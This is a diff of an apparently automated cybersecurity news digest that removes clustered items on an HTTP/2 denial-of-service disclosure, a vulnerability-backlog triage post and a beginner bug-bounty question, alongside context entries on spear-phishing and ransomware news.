@@ -3782,41 +3911,6 @@ China is stealing data from high-value targets via a sneaky, double-layer spear-
   - Published: 2026-06-02T19:50:53+00:00
   - Link: https://www.darkreading.com/threat-intelligence/china-uses-dual-method-attack-czech-taiwan-orgs
   - Summary: China is stealing data from high-value targets via a sneaky, double-layer spear-phishing campaign that includes the Azureveil malware.
-
-### Cluster ac3891b02c — score 8
-
-- Title: New HTTP/2 Bomb Vulnerability Allows Remote DoS on NGINX, Apache, IIS, Envoy & Cloudflare
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-06-03T08:33:35+00:00
-- Link: https://thehackernews.com/2026/06/new-http2-bomb-vulnerability-allows.html
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: ddos
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ddos
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Cybersecurity researchers have discovered a remote denial-of-service exploit that affects major web servers, including NGINX, Apache HTTPD, Microsoft IIS, Envoy, and Cloudflare Pingora. The vulnerability has been codenamed HTTP/2 Bomb by Calif. "The vulnerable behavior exists in each server's default HTTP/2 configuration," the company said, adding it was discovered by OpenAI Codex by chaining
-```
-
-#### Corroborating sources (1)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: New HTTP/2 Bomb Vulnerability Allows Remote DoS on NGINX, Apache, IIS, Envoy & Cloudflare
-  - Published: 2026-06-03T08:33:35+00:00
-  - Link: https://thehackernews.com/2026/06/new-http2-bomb-vulnerability-allows.html
-  - Summary: Cybersecurity researchers have discovered a remote denial-of-service exploit that affects major web servers, including NGINX, Apache HTTPD, Microsoft IIS, Envoy, and Cloudflare Pingora. The vulnerability has been codenamed HTTP/2 Bomb by Calif. "The vulnerable behavior exists in each server's default HTTP/2 configuration," the company said, adding it was discovered by OpenAI Codex by chaining
 
 ### Cluster 8f36ac3451 — score 8
 
@@ -3886,39 +3980,6 @@ submitted by /u/dn3t [link] [comments]
   - Link: https://www.reddit.com/r/netsec/comments/1txidow/unauthenticated_rce_as_qsecofr_via_ibm_i/
   - Summary: submitted by /u/dn3t [link] [comments]
 
-### Cluster 9c312e9a26 — score 8
-
-- Title: What are the best risk-based vulnerability management tools for tracking active exploitation in 2026?
-- Source: Reddit r/blueteamsec (reddit_practitioner_osint)
-- Published: 2026-06-09T06:56:52+00:00
-- Link: https://www.reddit.com/r/blueteamsec/comments/1u0xjx7/what_are_the_best_riskbased_vulnerability/
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_5_chatter
-
-#### Primary article taxonomy
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_5_chatter
-
-#### Summary
-
-```
-our vuln backlog is sitting around 40k open findings instances rn and honestly nobody looks at the whole queue anymore. team of 3 doing triage across infra + appsec. we start with crit/high first but with 40k open honestly at this point its basically vibes. the process mostly turns into trying to figure out which things might realistically blow up before the next scan cycle dumps another few thousand tickets on top. same CVE shows up from tenable, snyk and trivy with slightly different scores and different asset context so half the discussion ends up being whether we're looking at one issue or three. then you get into ownership and it gets worse. some findings still route into ServiceNow groups that havent had active members since a reorg last year. tickets just sit there aging until somebody notices during SLA review. thing that finally shook leadership a bit was missing a KEV because it got buried in the noise. wasnt hidden. scanner saw it. we dont have a clean way to surface whether
-```
-
-#### Corroborating sources (1)
-
-- **Reddit r/blueteamsec** (reddit_practitioner_osint)
-  - Title: What are the best risk-based vulnerability management tools for tracking active exploitation in 2026?
-  - Published: 2026-06-09T06:56:52+00:00
-  - Link: https://www.reddit.com/r/blueteamsec/comments/1u0xjx7/what_are_the_best_riskbased_vulnerability/
-  - Summary: our vuln backlog is sitting around 40k open findings instances rn and honestly nobody looks at the whole queue anymore. team of 3 doing triage across infra + appsec. we start with crit/high first but with 40k open honestly at this point its basically vibes. the process mostly turns into trying to figure out which things might realistically blow up before the next scan cycle dumps another few thousand tickets on top. same CVE shows up from tenable, snyk and trivy with slightly different scores and different asset context so half the discussion ends up being whether we're looking at one issue or three. then you get into ownership and it gets worse. some findings still route into ServiceNow groups that havent had active members since a reorg last year. tickets just sit there aging until somebody notices during SLA review. thing that finally shook leadership a bit was missing a KEV because it got buried in the noise. wasnt hidden. scanner saw it. we dont have a clean way to surface whether
-
 ### Cluster bfe4280a05 — score 8
 
 - Title: Ransomware attack shuts Illinois high school until Wednesday
@@ -3953,36 +4014,3 @@ submitted by /u/NISMO1968 [link] [comments]
   - Published: 2026-06-09T12:05:21+00:00
   - Link: https://www.reddit.com/r/cybersecurity/comments/1u13281/ransomware_attack_shuts_illinois_high_school/
   - Summary: submitted by /u/NISMO1968 [link] [comments]
-
-### Cluster 19580029cd — score 8
-
-- Title: Looking for a vulnerability to learn
-- Source: Reddit r/cybersecurity (reddit_practitioner_osint)
-- Published: 2026-06-09T04:35:15+00:00
-- Link: https://www.reddit.com/r/cybersecurity/comments/1u0uywq/looking_for_a_vulnerability_to_learn/
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_5_chatter
-
-#### Primary article taxonomy
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_5_chatter
-
-#### Summary
-
-```
-TL;DR: Just looking for a relevant, beginner friendly, and preferably not too automation-reliant. what's up guys, I a quite new to bug bounty and i have been learning only IDOR because i heard that its best to stick to one vulnerability till you completly mastered it then progress further by time, but I don't know if its something i missed or not but i havent been finding any for a couple of month now so i started looking for another ones to learn, sql and xss seem good but they are quite popular so i dont know if it would be easy to find them, i am searching for a vuln that is more relevant and i would really appreciate it if it was beginner friendly and doesnt rely heavely on automation cause competing with other automators sucks. submitted by /u/Typical-Book7465 [link] [comments]
-```
-
-#### Corroborating sources (1)
-
-- **Reddit r/cybersecurity** (reddit_practitioner_osint)
-  - Title: Looking for a vulnerability to learn
-  - Published: 2026-06-09T04:35:15+00:00
-  - Link: https://www.reddit.com/r/cybersecurity/comments/1u0uywq/looking_for_a_vulnerability_to_learn/
-  - Summary: TL;DR: Just looking for a relevant, beginner friendly, and preferably not too automation-reliant. what's up guys, I a quite new to bug bounty and i have been learning only IDOR because i heard that its best to stick to one vulnerability till you completly mastered it then progress further by time, but I don't know if its something i missed or not but i havent been finding any for a couple of month now so i started looking for another ones to learn, sql and xss seem good but they are quite popular so i dont know if it would be easy to find them, i am searching for a vuln that is more relevant and i would really appreciate it if it was beginner friendly and doesnt rely heavely on automation cause competing with other automators sucks. submitted by /u/Typical-Book7465 [link] [comments]
